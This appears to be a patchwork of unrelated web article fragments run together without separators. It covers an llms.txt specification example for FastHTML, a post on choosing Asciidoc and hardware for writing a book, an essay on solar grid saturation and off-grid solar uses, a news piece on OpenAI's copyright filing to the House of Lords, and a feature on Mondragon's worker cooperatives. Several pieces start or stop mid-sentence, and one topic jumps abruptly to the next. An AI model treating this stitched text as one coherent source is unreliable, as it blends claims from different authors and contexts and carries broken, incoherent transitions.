<p>Here’s an example of <code>llms.txt</code>, in this case a cut down version of the file used for the FastHTML project (see also the <a href="https://docs.fastht.ml/llms.txt">full version</a>:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span># FastHTML</span></span>

<span id="cb2-3"><span>&gt; FastHTML is a python library which brings together Starlette, Uvicorn, HTMX, and fastcore's </span><span>`FT`</span><span> "FastTags" into a library for creating server-rendered hypermedia applications.</span></span>
<span id="cb2-4"></span>
<span id="cb2-5">Important notes:</span>
<span id="cb2-6"></span>
<span id="cb2-7"><span>- </span>Although parts of its API are inspired by FastAPI, it is *not* compatible with FastAPI syntax and is not targeted at creating API services</span>
<span id="cb2-8"><span>- </span>FastHTML is compatible with JS-native web components and any vanilla JS library, but not with React, Vue, or Svelte.</span>

<p>To create effective <code>llms.txt</code> files, consider these guidelines: Use concise, clear language. When linking to resources, include brief, informative descriptions. Avoid ambiguous terms or unexplained jargon. Run a tool that expands your <code>llms.txt</code> file into an LLM context file and test a number of language models to see if they can answer questions about your content.</p>

<h2 data-anchor-id="next-steps">Next steps</h2>
<p>The <code>llms.txt</code> specification is open for community input. A <a href="https://github.com/AnswerDotAI/llms-txt">GitHub repository</a> hosts <a href="https://github.com/AnswerDotAI/llms-txt/blob/main/nbs/index.md">this informal overview</a>, allowing for version control and public discussion.

A book for aspiring </span><strong>Engineering Managers</strong><span>.</span></p><p>We quickly realized that writing was a much larger undertaking than we had anticipated. We also found ourselves overwhelmed by the numerous tools used in the industry.</p><p><span>As engineering managers, we knew one thing for certain: we wanted to </span><strong>optimize the process</strong><span> to make it as seamless as possible, allowing us to focus solely on the content.</span></p><p>Since committing to this colossal task, we've conducted extensive research on the best tools and ways to improve our workflow. In our quest for efficiency, we've discovered various methods that others use to achieve the same goal.</p><p><span>In this article, we will share our journey through various tools and explain how we chose </span><strong><a href="https://asciidoc.org/" rel="">Asciidoc</a></strong><span> as our "</span><strong>chisel</strong><span>." We will also discuss the tools we've developed to quickly and efficiently transform our content into a publishable asset.</span></p><p>As you can imagine, writing a book involves a significant amount of time spent with your chosen writing tools. Your desk, chair, keyboard, and software all contribute to how smooth (or challenging) your writing experience will be.</p><p>If you select a tool with several shortcomings—such as an inability to layout the book as desired—a significant portion of your time will be spent overcoming those challenges.</p><p>We did extensive preliminary research before we started where we talked to a couple of friends and family to ask about the tools they used to write their books in.</p><p><span>The most common answer was; </span><strong>Microsoft Word</strong></p><p><span>We knew up front that, whatever solution we picked, it should be </span><strong>accessible</strong><span>, </span><strong>easy-to-use</strong><span>, </span><strong>free</strong><span> and preferably </span><strong>open-source</strong><span>. That way, we would be able to have a repeatable and shareable setup. So </span><strong>Microsoft Word</strong><span> was a </span><strong>no-go</strong><span> for us.</span></p><p><strong>Google Docs</strong><span> was the next best choice. A fair bit of publishing companies as well as many authors do use it. It has the all the features which you would expect from a text editor and it’s </span><strong>free</strong><span> (if you exclude the fact that you’re data is being processed by a tech giant).</span></p><p><strong>Google Docs</strong><span> does not provide a great experience when it comes to writing but it definitely is accessible. It’s very easy to just pop open your browser and start typing.</span></p><p><span>As developers, quite often, we make use of </span><strong><a href="https://www.markdownguide.org/" rel="">Markdown</a></strong><span> to write our </span><strong>README</strong><span>s. This has given us a certain affinity with the language. We are engineers after all!</span></p><p><span>Therefore, after having experimented with </span><strong>Google Docs</strong><span>, we quickly decided that the workflow we have to manage our READMEs would work way better. We get to use our favorite text editor (</span><strong><a href="https://neovim.io/" rel="">Neovim</a></strong><span>, </span><strong><a href="https://code.visualstudio.com/" rel="">Visual Studio Code</a></strong><span>, etc.) which makes it very easy-to-use and accessible. Most editors are free and quite few of them are also open source.</span></p><p><strong>Markdown</strong><span> does satisfy all the conditions we initially had in mind.</span></p><p>What we didn’t know at the time, however, is the fact that, to self-publish a book, it is not sufficient to just have the content ready. The book needs to be laid out. It has to adhere to common conventions about structure, such as from and back matters, book index, table of content. All of which, is very difficult to do in Markdown, since it’s not really built for such tasks.</p><p><span>Frustrated by </span><strong>Markdown</strong><span>'s limitations, we found ourselves searching once again for a better solution—something that could offer the simplicity of Markdown while also providing the advanced features needed to prepare text for publication.</span></p><p><span>That's when we discovered </span><strong><a href="https://asciidoc.org/" rel="">Asciidoc</a></strong><span>.</span></p><p><strong>Asciidoc</strong><span> offers a rich feature set, encompassing everything you need to write a book. It includes not just the basics but also advanced tools like index generation and book covers. Additionally, </span><strong><a href="https://asciidoctor.org/" rel="">Asciidoctor</a></strong><span> enhances the experience with a robust suite of publishing tools.</span></p><p><span>All the way from custom type faces (allowing us to use our favourite typefaces from </span><strong><a href="https://connary.com/fonts.html" rel="">Connary Fagen</a></strong><span>) to being able to easily generate the front and back matter, including the covers as well as a index.</span></p><p><span>We also considered another option: </span><strong><a href="https://www.latex-project.org//" rel="">LaTeX</a></strong><span>. While </span><strong>LaTeX</strong><span> would have certainly provided the flexibility we needed (and more), it would come at the expense of accessibility.</span></p><p><span>The memory of countless hours spent during university writing our first scientific paper with </span><strong>LaTeX</strong><span> quickly reminded us why it wasn't the right choice for this project. We decided to look elsewhere.</span></p><p>You'll spend most of your time typing, and before long, your backspace key might start wearing out. That's why we strongly recommend investing in the right setup. A proper desk that supports good posture will help you work more efficiently and reduce the risk of injury.</p><p><span>One of the most important components of the equation is your keyboard. </span><strong></strong></p><p><span> prefers to use a </span><strong><a href="https://www.zsa.io/voyager" rel="">ZSA Voyager</a></strong><span>, which allows him to have an open posture thanks to the split form factor. It also allows him to spend less energy moving his fingers around the board, </span><strong>keeping his wrists happy</strong><span>.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg" width="1456" height="658" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:658,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:1185744,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F004fb8de-ebfa-4f07-95fb-4a5cd8f72bc8_3455x1561.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><span>Where you sit or stand is as important (if not more) than your keyboard. </span><strong></strong></p><p><span> is more old school in the sense that he prefers to sit whilst writing.

But the more that we connect, the harder it is to hook up new solar. This is for two reasons.</p><p><strong>Saturation reason #1: Solar competes with solar (“cannibalisation”)</strong></p><p>Solar panels all generate power at the same time of day: when the sun’s out.</p><figure><img src="https://climate.benjames.io/content/images/2024/08/Prices-by-time-of-day.jpg" alt="" loading="lazy" width="2000" height="1108" srcset="https://climate.benjames.io/content/images/size/w600/2024/08/Prices-by-time-of-day.jpg 600w, https://climate.benjames.io/content/images/size/w1000/2024/08/Prices-by-time-of-day.jpg 1000w, https://climate.benjames.io/content/images/size/w1600/2024/08/Prices-by-time-of-day.jpg 1600w, https://climate.benjames.io/content/images/size/w2400/2024/08/Prices-by-time-of-day.jpg 2400w" sizes="(min-width: 720px) 720px"></figure><p>Adding more solar drives down electricity prices when it’s sunny, because energy supply in sunny hours increases. This means that all solar panels get paid less $$$ per unit of energy produced. If you add a <em>lot </em>of solar, at some point it becomes uneconomical to build the next marginal panel. You are just adding electricity at times that nobody needs it (although we are still very far from this point).</p><div><p>Note: this creates tremendous price incentives to <strong>move demand</strong> to the times when renewables are abundant. Taking advantage of this cheap power should be our first priority for integrating renewables into the grid.</p><p>Much of the looming demand from EVs and electrified heating is flexible, meaning that a lot of future electricity demand will intelligently align with the greenest and cheapest power. This is what we are working on at <a href="https://axle.energy/?ref=climate.benjames.io">Axle Energy</a>.</p></div><p>When there’s enough surplus energy supply from renewables, prices can even go negative. That's great news for consumers - who get paid to use energy - but it's bad news for renewable generators. Too much negative pricing will mean that new renewables don't get built, because they won't break even.</p><figure><img src="https://climate.benjames.io/content/images/2024/08/Negative-pricing--1-.png" alt="" loading="lazy" width="2000" height="2290" srcset="https://climate.benjames.io/content/images/size/w600/2024/08/Negative-pricing--1-.png 600w, https://climate.benjames.io/content/images/size/w1000/2024/08/Negative-pricing--1-.png 1000w, https://climate.benjames.io/content/images/size/w1600/2024/08/Negative-pricing--1-.png 1600w, https://climate.benjames.io/content/images/2024/08/Negative-pricing--1-.png 2004w" sizes="(min-width: 720px) 720px"><figcaption>Source: European Union Agency for the Cooperation of Energy Regulators 2023 Market Monitoring Report</figcaption></figure><p><strong>Saturation reason #2: Grid capacity</strong></p><p>A surprising thing about the power grid is that it’s very difficult to connect up new electricity generation. Even if solar farms are quick to build, they are not quick to integrate with the grid.</p><p>In the UK, the average wait for a grid connection is more than 5 years, and over 40% of queuing projects have a connection date beyond 2030. </p><p>In the US, the size of the grid connection queue has increased over 7x in the past decade, and 95% of the queue is solar, wind and batteries. The capacity in the queue is now <a href="https://emp.lbl.gov/news/grid-connection-backlog-grows-30-2023-dominated-requests-solar-wind-and-energy-storage?ref=climate.benjames.io">more than twice</a> the installed capacity of all existing U.S. power plants.</p><h2 id="what-to-do-with-all-the-solar">What to do with all the solar?</h2><p>Solar will saturate the power grid, but that doesn’t mean that we’ll stop building it.

That is a dream day at the office for the lithium-ion battery. The more solar we install, the more we will be deluged by batteries - bathing in volatility like pigs in mud. If you are not yet sold on the idea that batteries will eat the world, you should <a href="https://www.noahpinion.blog/p/decade-of-the-battery-334?ref=climate.benjames.io">read</a> <a href="https://caseyhandmer.wordpress.com/2020/12/27/the-future-of-electricity-is-local/?ref=climate.benjames.io">these</a> <a href="https://climate.benjames.io/batteries">posts</a>. Like solar, the costs of lithium-ion batteries are plummeting every year.</p><p>The problem: we won’t have enough grid capacity to dump solar energy into batteries through the high voltage transmission system. We’ve already established that when the sun is out, we’ll blow through the limits of what the grid can handle.</p><p>This means that solar and batteries will have to zippity-zap each other without touching the transmission grid. Hence: solar and storage will have to be<em> </em>locally installed. This means we’ll get co-located utility solar and storage, homes with personal batteries for their solar, and new batteries springing up next to existing solar generation.</p><p>To be clear, a lot of the electricity transferred between solar farms and big batteries will still go through parts of the local distribution grid. And a lot of this solar will be <em>under-gridded</em>, rather than entirely off-grid. But it would be foolish to rely on new transmission lines to absorb our entire future solar capacity. Transmission lines are expensive and slow to build; batteries are cheap and quick to deploy.</p><p><strong>#2: Solar for intermittent processes</strong></p><p>Using batteries to backup solar is intuitive. Less obvious is the idea of surrendering to the sun, and only using energy during the magic lump. </p><p>If you only use energy for one quarter of the day, your solar system gets <em>much cheaper</em>, because you don’t need a battery. This is actually the cheapest electricity in the world.</p><figure><img src="https://climate.benjames.io/content/images/2024/08/Capex-split--solar-vs-batts--3-.png" alt="" loading="lazy" width="1684" height="1363" srcset="https://climate.benjames.io/content/images/size/w600/2024/08/Capex-split--solar-vs-batts--3-.png 600w, https://climate.benjames.io/content/images/size/w1000/2024/08/Capex-split--solar-vs-batts--3-.png 1000w, https://climate.benjames.io/content/images/size/w1600/2024/08/Capex-split--solar-vs-batts--3-.png 1600w, https://climate.benjames.io/content/images/2024/08/Capex-split--solar-vs-batts--3-.png 1684w" sizes="(min-width: 720px) 720px"><figcaption>Sources: own calcs, NREL U.S. Solar Photovoltaic System and Energy Storage Cost Benchmarks, <a href="https://cleanenergyreview.io/p/how-do-we-make-solar-even-cheaper?ref=climate.benjames.io">Clean Energy Review</a></figcaption></figure><p>These prices are already quite cheap, but we’ve seen nothing yet. The cost of solar energy in a sunny place is trending towards virtually-free.</p><p>This is solar’s opportunity to not just displace <em>electricity</em> supply, but also <em>primary energy</em> supply. Rather than simply supplying energy in the form it’s consumed (electricity), intermittent solar is so fricking cheap that it could manipulate atoms into fuels for subsequent consumption.</p><p>We’re talking about using solar to create synthetic kerosene for planes, clean ammonia for fertiliser, clean methanol for shipping, and maybe even synthetic natural gas for general purpose use.</p><p>These synthetic and ‘green’ fuels <a href="https://climate.benjames.io/hydrogen/">all rely on green hydrogen</a> as a base ingredient. Green hydrogen is extraordinarily expensive to produce, and the only cost-competitive way to make it is off-grid solar.</p><p>Off-grid solar is not just one way that synthetic fuels like Sustainable Aviation Fuel can be made - it is the <em>only</em> way that they can be cost competitively produced.</p><figure><img src="https://climate.benjames.io/content/images/2024/08/Cost-of-e-SAF-with-energy--2-.jpg" alt="" loading="lazy" width="2000" height="1549" srcset="https://climate.benjames.io/content/images/size/w600/2024/08/Cost-of-e-SAF-with-energy--2-.jpg 600w, https://climate.benjames.io/content/images/size/w1000/2024/08/Cost-of-e-SAF-with-energy--2-.jpg 1000w, https://climate.benjames.io/content/images/size/w1600/2024/08/Cost-of-e-SAF-with-energy--2-.jpg 1600w, https://climate.benjames.io/content/images/size/w2400/2024/08/Cost-of-e-SAF-with-energy--2-.jpg 2400w" sizes="(min-width: 720px) 720px"><figcaption>Figure from my post: <a href="https://climate.benjames.io/saf/"><em>The Big Guide to Sustainable Aviation Fuel</em></a></figcaption></figure><p>And it’s not just fuel production.

Direct Air Capture, industrial heating, electrochemical-everything; all are fair game.</p><p>Taking solar off the grid also has a few other major cost advantages. If you are ripping solar straight into a DC application, you can skip the costs and efficiency losses of inverting that power into AC. If you lose most of the balance of plant, power electronics, and the paperwork of a grid connection, you’re getting really cheap and fast.</p><h2 id="conclusion">Conclusion</h2><p>The question “can we build processes that use free energy one quarter of the time” is one of the most important and unexplored questions in the future of energy. Make no mistake: it is <em>hard</em> to build these processes, because quartering your output dramatically worsens the payback period for capital intensive process plants. But whilst this is difficult to do, frankly we haven’t tried. Conventional chemical engineering wisdom optimises for expensive inputs, continuous output, and high efficiency. The design space for low utilisation, free energy, is ripe for exploration.</p><p>The fact remains: few people optimise for intermittent solar, and intermittent solar will change the world.</p><p>-</p><p>Thanks to <a href="https://x.com/nikomccarty?ref=climate.benjames.io">Niko</a>, <a href="https://cleanenergyreview.io/?ref=climate.benjames.io">Sean</a> and <a href="https://www.tracinskiletter.com/?ref=climate.benjames.io">Rob</a> for their extremely thoughtful comments on this piece.</p><p>The origination of many ideas in this post come from <a href="https://caseyhandmer.wordpress.com/?ref=climate.benjames.io">Casey Handmer</a>, who deserves great credit for popularising them.

<div id="readability-page-1" class="page"><div id="incArticle"><h2>"It would be impossible to train today’s leading AI models without using copyrighted materials."</h2><h2>Please Sir</h2><p>OpenAI is begging the British Parliament to allow it to use copyrighted works because it's supposedly "impossible" for the company to train its artificial intelligence models — and continue growing its <a href="https://qz.com/openai-is-set-to-see-its-valuation-at-80-billion-makin-1850950928">multi-billion-dollar business</a> —&nbsp;without them.</p><p>As&nbsp;<a href="https://www.telegraph.co.uk/business/2024/01/07/openai-warns-copyright-crackdown-could-doom-chatgpt/"><em>The Telegraph</em> reports</a>, the AI firm said in a filing submitted to a House of Lords subcommittee that using only content from the public domain would be insufficient to train the kind of large language models (LLMs) it's building, suggesting that the company must therefore be allowed to use copyrighted material.</p><p>"Because copyright today covers virtually every sort of human expression — including blog posts, photographs, forum posts, scraps of software code, and government documents — it would be impossible to train today's leading AI models without using copyrighted materials," the company wrote in the evidence filing. "Limiting training data to public domain books and drawings created more than a century ago might yield an interesting experiment, but would not provide AI systems that meet the needs of today's citizens."</p><p>OpenAI went on to insist in the document, submitted before the House of Lords' communications and digital committee, that it complies with copyright laws and that the company believes "legally copyright law does not forbid training."</p><h2>Rank and File</h2><p>There's a growing chorus of interested parties who strongly disagree with OpenAI's assertion that it's chill and legal to use copyrighted work to train AI.</p><p>Just a few weeks ago, the <a href="https://www.nytimes.com/2023/12/27/business/media/new-york-times-open-ai-microsoft-lawsuit.html"><em>New York Times</em> sued OpenAI</a> and Microsoft, its biggest investor, for profiting from allegedly "massive copyright infringement, commercial exploitation and misappropriation" of the paper's intellectual property.</p><p>The paper of record is far from alone in its legal overtures against OpenAI. A few months prior, the <a href="https://www.courthousenews.com/authors-guild-to-add-microsoft-in-its-lawsuit-against-openai/">Authors Guild sued the firm</a> on behalf of some of the biggest names in fiction — including John Grisham, Jodi Picoult, Jonathan Franzen, David Baldacci, and George R.R. Martin — over objections to those writers' work being used to train ChatGPT.</p><p>Without using copyrighted work, OpenAI "would have a vastly different commercial product," Rachel Geman, one of the attorneys in the guild's class action suit, said in a <a href="https://authorsguild.org/news/ag-and-authors-file-class-action-suit-against-openai/">press release about the filing</a>. As such, the company's "decision to copy authors' works, done without offering any choices or providing any compensation, threatens the role and livelihood of writers as a whole."</p><p>On OpenAI's end, the company claims that it's seeking to broker new publisher partnerships,&nbsp;<em>The Telegraph</em> reports. All the same, it's hard to imagine every newspaper, website, or publishing house accepting such terms wholesale, much less <a href="https://futurism.com/the-byte/ai-analytics-books-shutdown">independent writers</a> who rely on their copyrights to <a href="https://futurism.com/ai-writing-scammers-amazon">make a living</a>.</p><p><strong>More on authors and AI:</strong> <a href="https://futurism.com/the-byte/ai-companies-hiring-authors-poets-fix-writing"><em>AI Companies Desperately Hiring Authors and Poets to Fix Their Crappy Writing</em></a></p><br></div></div>]]></description>

Perhaps that’s why science fiction authors like Ursula Le Guin, Kim Stanley Robinson, and Cory Doctorow have all used the corporation as a model for the utopian nations in their books.&nbsp;</p><p><span>Could we eventually create a capitalist paradise where democratically run companies use their profits for the good of their worker citizens?</span><em> </em><span>Could that even replace our existing governments?</span></p><p>“Years ago our founders had this kind of vision—to have a ‘world cooperative economy,’” Germán Lorenzo, who works in community education, told me when I visited Mondragon’s headquarters. “An ideal utopia would be a full cooperative world—people own the means of production, there’s a fair distribution of wealth.”</p><p>In 1956, one Catholic priest began building it—starting with the Basque Country.</p><p>Father José María Arizmendiarrieta was just 26 years old when he was sent to the parish of Arrasate-Mondragón for his first (and what would be only) assignment in 1941. It was just after the Spanish Civil War and the country was under the control of the nationalist dictator Franco. Arrasate was destitute with high levels of unemployment and economic hardship. People needed money, which meant they needed jobs.&nbsp;</p><p>So Arizmendiarrieta created them.</p><p>What started as one employee-owned business became a network of them as he and his followers kept starting new businesses and adding them to the network. They worked like an incubator, founding a university that would train entrepreneurs, then a bank that would fund their visions. They built manufacturing companies that would give them high-paying jobs, a housing company as they grew, and a preschool where their children could get an education while they worked.&nbsp;</p><p>Each new startup arose out of the needs of the community, and each one was owned by its workers. Eventually, they bought up an entire mountain and expanded to neighboring cities. As they grew and joined the EU they became more competitive worldwide, founding tech companies and R&amp;D facilities. Today, three out of every 10 cars use Mondragon components, 90% of the world’s aircraft use their technology solutions, 60% of the world’s trains are built using their machines, and more than a third of Europe’s solar panels are made using their technology. You can find Mondragon brands in Audi cars and Tour de France bikes, technologically advanced hospitals and electric vehicle charging stations, green energy power solutions and water management facilities.&nbsp;</p><p>Mondragon has spread throughout the seven cities of the Alto Deba region. No matter what you do for work here you are probably working for a cooperative, and no matter what you spend money on you’re also supporting one. You might work as a computer engineer for a tech cooperative, deposit your paycheck into a cooperative bank, and spend it at a cooperative grocery store or on cooperative-built cars. Your home might be powered by a cooperative-run energy company, your children might attend a cooperative school or university, and your parents might live in a cooperative retirement community.&nbsp;</p><p>As they say in the Basque Country: “Life is cooperatized here.”</p><p><span>Over time, these cooperatives have federated together as </span><a href="https://www.mondragon-corporation.com/en/" rel="">Mondragon Corporation</a><span>. Each cooperative is part of a larger division, and each division is part of the larger parent company. A cooperative that makes hubcaps, for example, might be part of the larger auto parts division, which is part of the larger Mondragon Corporation.&nbsp;</span></p><p>The profits generated by each cooperative are put to work for the benefit of the greater whole. Each cooperative gives 14-40% of their gross profits to their division (depending on the division), and another 14% to their parent company. The rest are invested back in the cooperative (60% of net profits), distributed among their employees (30% of net profits), and donated to social organizations in their communities (10% of net profits).</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png" width="1456" height="874" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/deedab28-ca02-4db3-a031-a26375745511_1600x960.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:874,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fdeedab28-ca02-4db3-a031-a26375745511_1600x960.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>How cooperative profits are distributed</figcaption></figure></div><p>The bulk of cooperative profits stay with the cooperative and its workers, but there are benefits to being part of the larger organizations. Divisions use surplus profits to account for losses within the group, and the Corporation uses half its revenue to invest in their businesses (and start new ones) and the other half to provide social services for workers.</p><p>When the Spanish government issued a regulation in 1958 that cooperative owners would no longer qualify for the country’s social security program, Mondragon created its own. They founded Lagun Aro, a social welfare arm that provides pensions for workers and their families, as well as disability services when they can’t work. Eventually, it created its own healthcare service, providing medical care for workers and their families.&nbsp;</p><p>When there was a massive downturn in the economy in the 1980s, 20 cooperatives were forced to close their doors, but other cooperatives in the portfolio were thriving so Mondragon just transferred people from one cooperative to another, paying for the education each worker needed to fulfill their new roles. On the whole, jobs rose.&nbsp;</p><p>If workers can’t be relocated, Lagun Aro will pay a percentage of their salary for up to 24 months—though Lorenzo tells me this has never happened. The most recent cooperative to shut its doors was an appliance company that once had revenues of €1.3 billion. When Fagor shuttered 10 years ago, Mondragon had to relocate close to 2,000 employees from one cooperative to another, and they did.&nbsp;</p><p>“In a crisis situation, where other companies send people home and they waste their time watching videos and smoking, what we do is train them inside, and retrain the force,” Lorenzo says. “People keep working. That's important.”</p><p>As their founder used to say, “There are no useless people, only underutilized ones.”</p><p><span>The area has become much wealthier as a result. “A large number of cooperative jobs are industrial so their income level is high,” cooperative communications officer Ander Etxeberria Otadui explained in </span><a href="https://exploremondragon.com/en/" rel="">a video series</a><span> about the organization. “Studies that analyzed Alto Deba at the beginning of the 1970s already showed that the per capita income was significantly higher than average for the province. Today, it has one of the highest average incomes in the Basque country. Plus it’s more equal.”&nbsp;</span></p><p>As a rule, the highest-paid workers at Mondragon cooperatives earn only six times more than the lowest-paid workers. A worker’s position on the payscale, between levels one and six, also determines their share of the profit-sharing pool. Lorenzo estimates that the president of Mondragon is the highest-paid position (level 6) with a salary of around €200,000. Managers and directors earn between €80,000 and €120,000. </p><p>Workers buy into their cooperative when they become employees, investing up to €16,000 into a personal equity account. They pay 30% of that investment upfront, with the remainder taken out of their paychecks over following 2 to 7 years. After two years with the organization, workers become “members” and start earning interest on their investment at a rate of at least 7.5% annually. If the cooperative does well, they might earn much more than that. Workers can pull this money out of their accounts when they leave the cooperative or retire.&nbsp;</p><p><span>“It’s a fact that the cooperative system uses wealth in a much more fair way,” Lorenzo says. “Our Gini Coefficient is similar to Sweden or Norway or Denmark, it’s very low. That means the cooperative system, in fact, is a much better way than the capital system for the world.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-1-147917881" href="https://www.elysian.press/p/mondragon-as-the-new-city-state#footnote-1-147917881" target="_self" rel="">1</a></span><span>”</span></p><p>When I asked, at an informational lecture, if people ever leave for better pay, Lorenzo said no one does. When another asked how they keep motivation high throughout employees' lengthy careers, Lorenzo recanted: “Your question is asked from the perspective of somebody who is working for somebody else. Here you are working for yourself. We have a higher level of self-consciousness.”&nbsp;</p><p>If workers want to try something different they have the autonomy to move elsewhere. Lorenzo started his career in global purchasing and imports for Eroski, Mondragon’s grocery store brand. Eventually, he moved to Hong Kong where he spent four years working in business development for Intergroup Far East, Mondragon’s international sourcing office. When he returned to Spain, Lorenzo headed up the Asia-Pacific group for Mondragon Corporation. Craving a change of pace, he then moved to Mondragon University’s business school where he spent a couple of years helping with their entrepreneurship program. Now, he’s working in global public affairs and communications, developing Mondragon’s corporate diplomacy and internal communications.</p><p>“I can’t say they didn’t give me room to move,” Lorenzo says. “My wife says they gave me too much.”</p><p>Every cooperative in Mondragon’s portfolio is an essential business—these are manufacturing companies, energy companies, agricultural companies, medical equipment companies, banks. They grow our food and power our cities and build our transportation systems. Their research and development groups invent machines and robotics that improve our world. There are no fast fashion or telemarketing companies in their portfolio. This cooperative of cooperatives is run by workers who directly build the things society needs while directly benefiting their communities with the profits they earn making them. They are self-governing locally even as they compete globally, with plants around the world and products and services sold in 150 countries.</p><p>The result is that Mondragon has created something of a self-sustaining government—and a pretty good one, I might add. Each cooperative functions like its own democracy, with workers functioning more like citizens. Cooperatives average 250 workers—if they grow much larger than that they are split into 